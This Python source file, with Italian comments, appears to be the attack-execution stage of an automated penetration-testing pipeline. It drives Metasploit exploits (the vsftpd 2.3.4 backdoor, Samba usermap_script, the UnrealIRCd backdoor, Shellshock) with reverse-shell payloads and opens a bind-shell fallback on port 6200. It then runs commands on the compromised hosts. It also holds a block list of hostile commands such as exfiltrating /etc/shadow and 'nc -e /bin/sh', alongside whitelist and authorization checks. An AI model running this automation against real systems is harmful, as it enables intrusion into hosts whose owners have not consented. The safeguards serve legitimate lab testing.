import sys
import os
import re
import time
import json
import yaml
import shlex
import socket
import subprocess
import asyncio
import logging
import ipaddress
import signal
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Optional
from dotenv import load_dotenv

load_dotenv()

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core_shared.ethics import request_authorization, AuditLog



def setup_logger(log_dir: str) -> logging.Logger:
    os.makedirs(log_dir, exist_ok=True)
    timestamp  = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file   = os.path.join(log_dir, f"executor_{timestamp}.log")

    logger = logging.getLogger("executor")
    logger.setLevel(logging.DEBUG)

    # Handler su file, log completo
    fh = logging.FileHandler(log_file)
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter(
        "%(asctime)s | %(levelname)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))

   
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter("%(message)s"))

    logger.addHandler(fh)
    logger.addHandler(ch)

    logger.info(f"[LOG] Log file: {log_file}")
    return logger


#WHitelist

class TargetWhitelist:
   

    def __init__(self):
        raw = os.getenv("TARGET_WHITELIST", "192.168.0.0/16,10.0.0.0/8")
        self.networks = []
        for entry in raw.split(","):
            entry = entry.strip()
            try:
                self.networks.append(ipaddress.ip_network(entry, strict=False))
            except ValueError:
                pass  # Ignora entry malformate

    def is_allowed(self, target: str) -> bool:
        #true se il target è in whitelsit
        try:
            ip = ipaddress.ip_address(target)
            return any(ip in net for net in self.networks)
        except ValueError:
            return False

    def allowed_networks_str(self) -> str:
        return ", ".join(str(n) for n in self.networks)


# Pattern bloccati
BLOCKED_PATTERNS = {
    "filesystem_destruction": [
        "rm -rf", "rm -fr", "mkfs", "dd if=", "shred",
        "> /dev/sda", "> /dev/hda"
    ],
    "fork_bomb": [
        ":(){", "fork()", "while True: os.fork()"
    ],
    "privilege_escalation_abuse": [
        "chmod 777 /etc", "chown root /bin/sh",
        "echo ALL >> /etc/sudoers"
    ],
    "network_exfiltration": [
        "curl -d @/etc/passwd", "wget --post-file=/etc/shadow",
        "nc -e /bin/sh 0.0.0.0"
    ],
    "metasploit_dangerous": [
        "exploit/multi/handler", "post/multi/manage/shell_to_meterpreter"
    ]
}

APPROVED_MSF_MODULES = [
    "auxiliary/scanner/portscan/tcp",
    "auxiliary/scanner/ftp/ftp_login",
    "auxiliary/scanner/ssh/ssh_login",
    "auxiliary/scanner/http/apache_userdir_enum",
    "exploit/unix/ftp/vsftpd_234_backdoor",
    "exploit/multi/samba/usermap_script",
    "exploit/unix/irc/unreal_ircd_3281_backdoor",
    "exploit/multi/http/apache_mod_cgi_bash_env_exec",
]
# Carica moduli extra approvati dal .env
_extra = os.getenv("MSF_EXTRA_APPROVED_MODULES", "")
if _extra:
    APPROVED_MSF_MODULES += [m.strip() for m in _extra.split(",") if m.strip()]

class SafetyValidator:

    def __init__(self, logger: logging.Logger):
        self.logger = logger

    def validate(self, tool: str, args: str, module: Optional[str] = None) -> tuple[bool, str]:
        """
        Restituisce (is_safe, motivo_se_bloccato).
        """
        full_cmd = f"{tool} {args}"

        # controllo su pattern bloccati
        for category, patterns in BLOCKED_PATTERNS.items():
            for pattern in patterns:
                if pattern in full_cmd:
                    reason = f"Pattern bloccato [{category}]: '{pattern}'"
                    self.logger.warning(f"[SAFETY BLOCK] {reason} in: {full_cmd}")
                    return False, reason

        # controllo dei moduli Metasploit
        if tool == "metasploit" and module:
            if module not in APPROVED_MSF_MODULES:
                reason = f"Modulo MSF non approvato: '{module}'"
                self.logger.warning(f"[SAFETY BLOCK] {reason}")
                return False, reason

        # Check target nell'args (non deve contenere ip pubblici se SANDBOX_MODE=true)
        sandbox = os.getenv("SANDBOX_MODE", "true").lower() == "true"
        if sandbox:
            #blocca ip pubblici
            import re
            ips_in_args = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', args)
            for ip_str in ips_in_args:
                try:
                    ip = ipaddress.ip_address(ip_str)
                    if not ip.is_private and not ip.is_loopback:
                        reason = f"SANDBOX MODE: IP pubblico bloccato negli args: {ip_str}"
                        self.logger.warning(f"[SAFETY BLOCK] {reason}")
                        return False, reason
                except ValueError:
                    pass

        return True, ""



class ToolRunner:
   

    def __init__(self, logger: logging.Logger):
        self.logger = logger

    def run(self, tool: str, args: str, timeout: int = 60) -> dict:
       
        cmd = f"{tool} {args}"
        start_time = datetime.now()

        self.logger.debug(f"[EXEC] CMD: {cmd} | timeout: {timeout}s")

        try:
            result = subprocess.run(
                shlex.split(cmd),   #per path con spazi
                capture_output=True,
                text=True,
                timeout=timeout
            )

            duration = (datetime.now() - start_time).seconds

            #log  completo
            self.logger.info(
                f"[RESULT] tool={tool} | exit_code={result.returncode} "
                f"| duration={duration}s | cmd={cmd}"
            )
            if result.stdout:
                self.logger.debug(f"[STDOUT]\n{result.stdout[:500]}")
            if result.stderr:
                self.logger.debug(f"[STDERR]\n{result.stderr[:200]}")

            return {
                "tool":       tool,
                "command":    cmd,
                "exit_code":  result.returncode,
                "success":    result.returncode == 0,
                "stdout":     result.stdout,
                "stderr":     result.stderr,
                "duration_s": duration,
                "timestamp":  start_time.isoformat()
            }

        except subprocess.TimeoutExpired:
            duration = (datetime.now() - start_time).seconds
            self.logger.warning(f"[TIMEOUT] {tool} superato timeout {timeout}s")
            return {
                "tool": tool, "command": cmd,
                "exit_code": -1, "success": False,
                "stdout": "", "stderr": f"Timeout dopo {timeout}s",
                "duration_s": duration, "timestamp": start_time.isoformat()
            }

        except FileNotFoundError:
            self.logger.error(f"[NOT FOUND] Tool non trovato: {tool}")
            return {
                "tool": tool, "command": cmd,
                "exit_code": -2, "success": False,
                "stdout": "", "stderr": f"Tool '{tool}' non trovato nel PATH",
                "duration_s": 0, "timestamp": start_time.isoformat()
            }

        except Exception as e:
            self.logger.error(f"[ERROR] {tool}: {e}")
            return {
                "tool": tool, "command": cmd,
                "exit_code": -3, "success": False,
                "stdout": "", "stderr": str(e),
                "duration_s": 0, "timestamp": start_time.isoformat()
            }



class MetasploitRunner:
  

    def __init__(self, logger: logging.Logger):
        self.logger   = logger
        self.host     = os.getenv("MSF_RPC_HOST", "127.0.0.1")
        self.port     = int(os.getenv("MSF_RPC_PORT", "55553"))
        self.password = os.getenv("MSF_RPC_PASSWORD", "msfrpc")
        self.client   = None
        self.mock_mode = True  # Default: mock
        self.opened_sessions = []  # id delle sessioni aperte, per cleanup reale

        try:
            # Tenta connessione reale
            from pymetasploit3.msfrpc import MsfRpcClient
            self.client    = MsfRpcClient(self.password, server=self.host, port=self.port)
            self.mock_mode = False
            self.logger.info("[MSF] Connessione a Metasploit RPC riuscita")
        except ImportError:
            self.logger.info("[MSF] pymetasploit3 non installato — modalità mock attiva")
        except Exception as e:
            self.logger.info(f"[MSF] RPC non disponibile ({e}) — modalità mock attiva")

    def _session_ids(self) -> set:
        try:
            return set(self.client.sessions.list.keys())
        except Exception:
            return set()

    def _detect_lhost(self, target: str) -> str:
        """IP locale verso il target (usato dai payload reverse)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target or "192.168.56.4", 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return os.getenv("LHOST", "")

    def _free_port(self) -> int:
       
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("", 0))
            port = s.getsockname()[1]
            s.close()
            return port
        except Exception:
            return 4444


#payload preferiti inseriti in modo hardcode!!   
    _PREFERRED_PAYLOADS = {
        "exploit/unix/ftp/vsftpd_234_backdoor": [
            "cmd/unix/reverse", "cmd/unix/reverse_perl",
            "cmd/linux/http/x86/meterpreter_reverse_tcp",
        ],
        "exploit/multi/samba/usermap_script": [
            "cmd/unix/reverse", "cmd/unix/reverse_netcat", "cmd/unix/reverse_perl",
        ],
        "exploit/unix/irc/unreal_ircd_3281_backdoor": [
            "cmd/unix/reverse", "cmd/unix/reverse_perl", "cmd/unix/reverse_ssl_double_telnet",
        ],
    }

    def _rport_for(self, module: str):
        return {
            "exploit/multi/samba/usermap_script": 139,
            "exploit/unix/irc/unreal_ircd_3281_backdoor": 6667,
        }.get(module)

    def _pick_payload(self, module: str, compatible: list) -> str:
      
        for p in self._PREFERRED_PAYLOADS.get(module, []):
            if not compatible or p in compatible:
                return p
        for p in (compatible or []):
            if "reverse" in p:
                return p
        if compatible:
            return compatible[0]
        return "cmd/unix/reverse"

    def run_module(self, module: str, options: dict, timeout: int = 120) -> dict:
        if self.mock_mode:
            self.logger.info(f"[MSF MOCK] Simulo esecuzione modulo: {module}")
            is_exploit = module.startswith("exploit/")
            return {
                "tool":    "metasploit",
                "module":  module,
                "success": (not is_exploit),
                "session_opened": False,
                "output":  f"[MOCK] Modulo {module} simulato (nessuna sessione reale) con opzioni: {options}",
                "mock":    True
            }

        import time
        is_exploit = module.startswith("exploit/")
      
        if is_exploit:
            timeout = max(timeout, 120)
        sessions_before = self._session_ids()

        try:
            mtype, mname = module.split("/", 1) 
            mod = self.client.modules.use(mtype, mname)

            # Opzioni base (es. RHOSTS)
            for key, val in options.items():
                try:
                    mod[key] = val
                except Exception:
                    pass

            # Porta remota specifica per samba e IRC
            rport = self._rport_for(module)
            if rport is not None:
                try:
                    mod["RPORT"] = rport
                except Exception:
                    pass

            # Selezione ESPLICITA del payload, altrimenti non apre sessione
            payload_ref  = None
            payload_name = None
            if is_exploit:
                try:
                    compatible = list(mod.payloads)
                except Exception:
                    compatible = []
                payload_name = self._pick_payload(module, compatible)

                lhost = self._detect_lhost(options.get("RHOSTS", ""))
                lport = self._free_port()
                try:
                    # Oggetto payload con le proprie opzioni (LHOST/LPORT)
                    pl = self.client.modules.use("payload", payload_name)
                    if lhost:
                        try: pl["LHOST"] = lhost
                        except Exception: pass
                    try: pl["LPORT"] = lport
                    except Exception: pass
                    payload_ref = pl
                except Exception as e:
                    # Fallback: passa il nome e imposta LHOST/LPORT sul modulo exploit
                    self.logger.warning(f"[MSF] Oggetto payload non creato ({e}) — uso il nome")
                    payload_ref = payload_name
                    if lhost:
                        try: mod["LHOST"] = lhost
                        except Exception: pass
                    try: mod["LPORT"] = lport
                    except Exception: pass
                self.logger.info(f"[MSF] Payload scelto per {module}: {payload_name} "
                                 f"(LHOST={lhost}, LPORT={lport}, compat={len(compatible)})")

           
            res = mod.execute(payload=payload_ref) if payload_ref else mod.execute()
            self.logger.info(
                f"[MSF] Modulo {module} avviato (payload={payload_name or 'default'}, "
                f"job_id={res.get('job_id') if isinstance(res, dict) else res})"
            )

            # Attende apertura di una sessione
            new_sessions = []
            waited = 0
            poll = 2
            while waited < timeout:
                time.sleep(poll)
                waited += poll
                new_sessions = list(self._session_ids() - sessions_before)
                if new_sessions:
                    break

            self.opened_sessions.extend(new_sessions)

            proof = self._proof_of_access(new_sessions)

            if is_exploit:
                success = len(new_sessions) > 0
                if success:
                    self.logger.info(f"[MSF] Modulo {module} RIUSCITO — sessione aperta: {new_sessions}")
                else:
                    self.logger.warning(f"[MSF] Modulo {module} eseguito ma NESSUNA sessione aperta entro {timeout}s")

                    target_ip = options.get("RHOSTS", "") or options.get("RHOST", "")
                    fb = self._bind_fallback(module, target_ip)
                    if fb and "uid=" in fb:
                        success = True
                        proof = fb
                        self.logger.info(f"[MSF] Modulo {module} RIUSCITO via connessione diretta alla backdoor (fallback bind)")
            else:
                success = isinstance(res, dict) and res.get("job_id") is not None
                self.logger.info(f"[MSF] Modulo auxiliary {module} avviato (success={success})")

            output = f"job={res} | nuove sessioni={new_sessions}"
            if proof:
                output = f"[PROOF OF ACCESS]\n{proof}\n\n{output}"
            return {
                "tool": "metasploit", "module": module,
                "success": success,
                "session_opened": bool(new_sessions),
                "new_sessions": new_sessions,
                "output": output,
                "evidence": proof,
                "mock": False
            }

        except Exception as e:
            self.logger.error(f"[MSF] Errore modulo {module}: {e}")
            return {
                "tool": "metasploit", "module": module,
                "success": False, "session_opened": False,
                "output": str(e), "mock": False
            }

    # Backdoor persistenti su una porta fissa
    # (bind shell). in caso l'handoff reverse fallisce
    _BIND_BACKDOOR_PORTS = {
        "exploit/unix/ftp/vsftpd_234_backdoor": 6200,
    }

    def _bind_fallback(self, module: str, target_ip: str) -> str:
       
        port = self._BIND_BACKDOOR_PORTS.get(module)
        if not port or not target_ip or self.mock_mode:
            return ""
        if os.getenv("PENTEST_PROOF", "1") == "0":
            return ""
        cmds = os.getenv("PENTEST_PROOF_CMDS", "id,uname -a,hostname,whoami").split(",")
        try:
            s = socket.create_connection((target_ip, port), timeout=10)
            s.settimeout(5)
            lines = [f"--- Backdoor diretta {target_ip}:{port} (fallback bind) ---"]
            for cmd in cmds:
                cmd = cmd.strip()
                if not cmd:
                    continue
                try:
                    s.sendall((cmd + "\n").encode())
                    time.sleep(1.0)
                    data = b""
                    try:
                        while True:
                            chunk = s.recv(4096)
                            if not chunk:
                                break
                            data += chunk
                            if len(data) > 8192:
                                break
                    except socket.timeout:
                        pass
                    lines.append(f"$ {cmd}\n{data.decode(errors='replace').strip()}")
                except Exception as e:
                    lines.append(f"$ {cmd}\n[errore: {e}]")
            try:
                s.close()
            except Exception:
                pass
            return "\n".join(lines)
        except Exception as e:
            self.logger.warning(f"[MSF] Fallback bind su {target_ip}:{port} non riuscito: {e}")
            return ""

    def _proof_of_access(self, session_ids) -> str:
      
        if self.mock_mode or not session_ids:
            return ""
        if os.getenv("PENTEST_PROOF", "1") == "0":
            return ""
        cmds = os.getenv("PENTEST_PROOF_CMDS", "id,uname -a,hostname,whoami").split(",")
        lines = []
        settle = float(os.getenv("PENTEST_PROOF_SETTLE", "2.5"))
        for sid in session_ids:
            lines.append(f"--- Sessione {sid} ---")
            try:
                shell = self.client.sessions.session(sid)
         
                time.sleep(settle)
                try:
                    shell.read()
                except Exception:
                    pass
                for cmd in cmds:
                    cmd = cmd.strip()
                    if not cmd:
                        continue
                    try:
                        out = self._shell_exec(shell, cmd)
                        if not out.strip():
                            # Retry una volta con finestra più ampia: su una shell reverse appena aperta il PRIMO comando (tipicamente 'id') può non restituire output entro la finestra iniziale.
                            out = self._shell_exec(shell, cmd, settle=0.6, max_wait=8.0)
                        lines.append(f"$ {cmd}\n{out}")
                    except Exception as e:
                        lines.append(f"$ {cmd}\n[errore lettura: {e}]")
            except Exception as e:
                lines.append(f"[Sessione {sid}: impossibile interagire: {e}]")
        proof = "\n".join(lines)
        self.logger.info("[MSF][PROOF OF ACCESS]\n" + proof)
        return proof

    @staticmethod
    def _shell_exec(shell, cmd: str, settle: float = 0.4, max_wait: float = 6.0) -> str:
        
        try:
            shell.read()
        except Exception:
            pass
        shell.write(cmd + "\n")
        out = ""
        waited = 0.0
        idle = 0
        while waited < max_wait:
            time.sleep(settle)
            waited += settle
            try:
                chunk = shell.read() or ""
            except Exception:
                chunk = ""
            if chunk:
                out += chunk
                idle = 0
            elif out:
                idle += 1
                if idle >= 2: 
                    break
        
        cleaned = out.strip()
        if cleaned.startswith(cmd):
            cleaned = cleaned[len(cmd):].strip()
    
        kept = [ln for ln in cleaned.splitlines()
                if not re.fullmatch(r"[A-Za-z0-9+/=]{16,}", ln.strip())]
        return "\n".join(kept).strip()

#CHiusura delle sessioni RPC aperte
    def cleanup_sessions(self):
        if self.mock_mode or not self.opened_sessions:
            self.opened_sessions = []
            return
        for sid in list(self.opened_sessions):
            try:
                self.client.sessions.session(sid).stop()
                self.logger.info(f"[MSF CLEANUP] Sessione {sid} chiusa via RPC")
            except Exception as e:
                self.logger.warning(f"[MSF CLEANUP] Impossibile chiudere la sessione {sid}: {e}")
        self.opened_sessions = []



#pulizia sess. aperte
class SessionManager:

    def __init__(self, logger: logging.Logger):
        self.logger    = logger
        self.processes = []   
        self.sessions  = []   # Descrizioni sessioni aperte 

    def register_process(self, proc):
        self.processes.append(proc)

    def register_session(self, desc: str):
        self.sessions.append(desc)
        self.logger.debug(f"[SESSION] Registrata: {desc}")

    def cleanup(self):
        #Termina tutti i processi e chiude le sessioni aperte.
        self.logger.info(f"[CLEANUP] Chiusura {len(self.processes)} processi, {len(self.sessions)} sessioni")

        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
                self.logger.debug(f"[CLEANUP] Processo {proc.pid} terminato")
            except Exception as e:
                self.logger.warning(f"[CLEANUP] Errore chiusura processo: {e}")
                try:
                    proc.kill()
                except Exception:
                    pass

        for sess in self.sessions:
            self.logger.info(f"[CLEANUP] Sessione chiusa: {sess}")

        self.processes.clear()
        self.sessions.clear()
        self.logger.info("[CLEANUP] Completato.")




def _inject_dependency_output(args: str, dep_output: str) -> str:
   
    if not args or "{{" not in args:
        return args
    out = dep_output or ""

    ip_m   = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', out)
    port_m = re.search(r'\b(\d{1,5})/tcp\s+open', out)
    cred_m = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', out, re.IGNORECASE)

    replacements = {
        "{{dep_ip}}":     ip_m.group(0) if ip_m else "",
        "{{dep_port}}":   port_m.group(1) if port_m else "",
        "{{dep_user}}":   cred_m.group(1) if cred_m else "",
        "{{dep_pass}}":   cred_m.group(2) if cred_m else "",
        "{{dep_output}}": out.strip().replace("\n", " ")[:200],
    }
    for key, val in replacements.items():
        args = args.replace(key, val)
    return args


async def execute_playbook(
    playbook: dict,
    target_ip: str,
    whitelist: TargetWhitelist,
    safety: SafetyValidator,
    runner: ToolRunner,
    msf: MetasploitRunner,
    session_mgr: SessionManager,
    logger: logging.Logger
) -> list[dict]:
   
    results        = []
    step_outputs   = {}   
    rollback_stack = []   

    steps = playbook.get("steps", [])
    logger.info(f"[EXEC] Avvio playbook '{playbook.get('plan_id')}' — {len(steps)} step")

    for step in steps:
        step_num  = step.get("step_number", 0)
        step_name = step.get("name", "unnamed")
        tool      = step.get("tool", "")
        args      = step.get("args", "")
        module    = step.get("module")
        timeout   = step.get("timeout_seconds", 60)
        on_fail   = step.get("on_failure", "skip_to_next")
        dep_step  = step.get("depends_on_step")
        rollback  = step.get("rollback_action")

        logger.info(f"\n[STEP {step_num}] {step_name} — {tool}")

        # whitelist 
        if not whitelist.is_allowed(target_ip):
            result = {
                "step_number": step_num, "step_name": step_name,
                "status": "BLOCKED", "reason": f"Target {target_ip} non in whitelist",
                "output": None
            }
            results.append(result)
            logger.warning(f"[BLOCKED] Target {target_ip} non autorizzato")
            break

        #verifica delle dipendenze
        if dep_step is not None:
            dep_result = step_outputs.get(dep_step)
            if dep_result and not dep_result.get("success", False):
                logger.warning(f"[SKIP] Step {step_num} saltato: dipendenza step {dep_step} fallita")
                results.append({
                    "step_number": step_num, "step_name": step_name,
                    "status": "SKIPPED",
                    "reason": f"Dipendenza step {dep_step} non soddisfatta",
                    "output": None
                })
                continue
            if dep_result:
                
                #catena multistadio
                dep_out  = dep_result.get("stdout", "") or ""
                new_args = _inject_dependency_output(args, dep_out)
                if new_args != args:
                    logger.info(f"[DEP] Step {step_num}: iniettati valori dall'output di step {dep_step}")
                    args = new_args

        
        is_safe, reason = safety.validate(tool, args, module)
        if not is_safe:
            result = {
                "step_number": step_num, "step_name": step_name,
                "status": "BLOCKED", "reason": reason, "output": None
            }
            results.append(result)
            logger.warning(f"[BLOCKED] Step {step_num}: {reason}")

            if on_fail == "abort":
                logger.error("[ABORT] Esecuzione interrotta per safety block")
                break
            continue

        
        if tool == "metasploit" and module:
            
            options = {"RHOSTS": target_ip}
            raw_result = await asyncio.get_event_loop().run_in_executor(
                None, lambda: msf.run_module(module, options, timeout)
            )
            exec_result = {
                "tool": "metasploit", "command": f"use {module}",
                "success": raw_result.get("success", False),
                "session_opened": raw_result.get("session_opened", False),
                "stdout": raw_result.get("output", ""),
                "stderr": "", "exit_code": 0 if raw_result.get("success") else 1,
                "duration_s": 0, "timestamp": datetime.now().isoformat()
            }
        else:
           
            exec_result = await asyncio.get_event_loop().run_in_executor(
                None, lambda: runner.run(tool, args, timeout)
            )

        
        success = exec_result.get("success", False)
        
        EXPLOIT_TOOLS = {"metasploit", "hydra", "sqlmap"}
        phase = "exploit" if tool.lower() in EXPLOIT_TOOLS else "recon"
        step_result = {
            "step_number": step_num,
            "step_name":   step_name,
            "status":      "SUCCESS" if success else "FAILED",
            "phase":       phase,
            "tool":        tool,
            "command":     exec_result.get("command", ""),
            "exit_code":   exec_result.get("exit_code", -1),
            "session_opened": exec_result.get("session_opened", False),
            "output":      exec_result.get("stdout", "")[:1000], #tronca x limite di token
            "error":       exec_result.get("stderr", "")[:500],
            "duration_s":  exec_result.get("duration_s", 0),
            "timestamp":   exec_result.get("timestamp", "")
        }

        results.append(step_result)
        step_outputs[step_num] = exec_result  
       
        if rollback:
            rollback_stack.append({
                "step_num": step_num,
                "step_name": step_name,
                "rollback_action": rollback
            })
            session_mgr.register_session(f"step_{step_num}_{step_name}")

        
        if not success:
            logger.warning(f"[FAILED] Step {step_num} fallito — on_failure: {on_fail}")

            if on_fail == "abort":
                logger.error("[ABORT] Esecuzione interrotta")
                break

            elif on_fail == "rollback":
                
                logger.info(f"[ROLLBACK] Avvio rollback per {len(rollback_stack)} step...")
                for rb in reversed(rollback_stack):
                    logger.info(f"  [ROLLBACK] Step {rb['step_num']} ({rb['step_name']}): {rb['rollback_action']}")
                break

            
            logger.info(f"[CONTINUE] Proseguo nonostante fallimento step {step_num}")

    return results


async def main():
    # Setup
    current_dir = os.path.dirname(os.path.abspath(__file__))
    log_dir     = os.path.join(current_dir, '..', 'logs')
    output_dir  = os.path.join(current_dir, '..', 'output')

    logger      = setup_logger(log_dir)
    whitelist   = TargetWhitelist()
    safety      = SafetyValidator(logger)
    runner      = ToolRunner(logger)
    msf         = MetasploitRunner(logger)
    session_mgr = SessionManager(logger)

    print("=" * 55)
    print("  ATTACK EXECUTOR")
    print("=" * 55)

    logger.info(f"[INFO] Target whitelist: {whitelist.allowed_networks_str()}")
    logger.info(f"[INFO] SANDBOX_MODE: {os.getenv('SANDBOX_MODE', 'true')}")

   
    playbook_path = os.path.join(output_dir, 'playbooks.json')
    if os.path.exists(playbook_path):
        with open(playbook_path) as f:
            data = json.load(f)
        playbooks  = data.get("playbooks", [])
        target_ip  = playbooks[0].get("steps", [{}])[0].get("args", "192.168.1.50")
        
        
        import re
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', target_ip)
        target_ip = ips[0] if ips else "192.168.1.50"
        logger.info(f"[INFO] Caricato playbooks.json — {len(playbooks)} piani")
    else:
        # Dati di test
        target_ip = "192.168.1.50"
        playbooks  = [{
            "plan_id": "plan_test",
            "description": "Piano di test",
            "success_probability": 0.8,
            "steps": [
                {
                    "step_number": 1, "name": "port_scan",
                    "tool": "nmap", "module": None,
                    "args": f"-sV -T4 --top-ports 100 {target_ip}",
                    "purpose": "Service discovery",
                    "expected_outcome": "Lista porte aperte",
                    "depends_on_step": None,
                    "on_failure": "continue",
                    "rollback_action": None,
                    "timeout_seconds": 60
                },
                {
                    "step_number": 2, "name": "http_enum",
                    "tool": "curl", "module": None,
                    "args": f"-s -o /dev/null -w '%{{http_code}}' http://{target_ip}",
                    "purpose": "Verifica porta 80",
                    "expected_outcome": "HTTP status code",
                    "depends_on_step": 1,
                    "on_failure": "skip_to_next",
                    "rollback_action": None,
                    "timeout_seconds": 10
                }
            ]
        }]
        logger.info("[INFO] Usando playbook di test (playbooks.json non trovato)")

#@check sull'ip 
    if not request_authorization(target_ip):
        logger.error(f"[STOP] Target {target_ip} non autorizzato — esecuzione annullata.")
        AuditLog().log("EXECUTION_DENIED", {"target": target_ip})
        return
    AuditLog().log("EXECUTION_STARTED", {"target": target_ip, "n_plans": len(playbooks)})


    all_results = []
    for best_plan in playbooks:
        logger.info(f"\n[INFO] Esecuzione piano: {best_plan.get('plan_id')}")
        logger.info(f"[INFO] Target: {target_ip}")

        try:
            results = await execute_playbook(
                best_plan, target_ip,
                whitelist, safety, runner, msf, session_mgr, logger
            )
        finally:
           
            msf.cleanup_sessions()  
            session_mgr.cleanup()

        #risultati
        print()
        print("=" * 55)
        print(f"  RISULTATI ESECUZIONE — {best_plan.get('plan_id')}")
        print("=" * 55)
        success_count = sum(1 for r in results if r["status"] == "SUCCESS")
        print(f"\n  Totale step: {len(results)}")
        print(f"  Successo:    {success_count}")
        print(f"  Falliti:     {len(results) - success_count}")
        print()

        for r in results:
            icon = {"SUCCESS": "✓", "FAILED": "✗", "BLOCKED": "⊘", "SKIPPED": "→"}.get(r["status"], "?")
            print(f"  {icon} Step {r['step_number']} [{r['status']:8s}] {r['step_name']}")
            if r.get("output"):
                lines = r["output"].splitlines()[:3]
                for l in lines:
                    print(f"      {l}")

        all_results.append({
            "plan_id": best_plan.get("plan_id"),
            "results": results
        })

    
    out_path = os.path.join(output_dir, 'execution_results.json')
    os.makedirs(output_dir, exist_ok=True)

    with open(out_path, "w") as f:
        json.dump({
            "target_ip":   target_ip,
            "executed_at": datetime.now().isoformat(),
            "all_plans":   all_results,
            "results":     [r for plan in all_results for r in plan["results"]]
        }, f, indent=2)

    logger.info(f"\n[INFO] Risultati salvati in output/execution_results.json")
    logger.info("[INFO] Pronto per il modulo Reporting Engine.")


if __name__ == "__main__":
    asyncio.run(main())
